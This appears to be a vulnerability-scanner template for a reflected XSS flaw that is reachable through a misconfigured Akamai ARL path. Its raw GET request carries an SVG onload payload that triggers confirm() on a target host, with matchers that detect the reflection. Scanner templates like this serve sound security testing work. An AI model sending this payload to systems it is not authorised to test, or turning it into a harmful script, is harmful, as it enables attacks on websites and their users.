id: Akamai-ARL-Misconfig
info:
  author: hacktifycs
  description: An adversary can perform a XSS by exploiting Akamai ARL
  name: Akamai ARL Misconfig
  reference: unknown
  severity: high
  tags: xss
requests:
- matchers:
  - condition: and
    type: word
    words:
    - xss
    - Citysearch
  raw:
  - 'GET /7/0/33/1d/www.citysearch.com/search?what=x&where=place"><svg+onload=confirm(%27xss%27)>
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
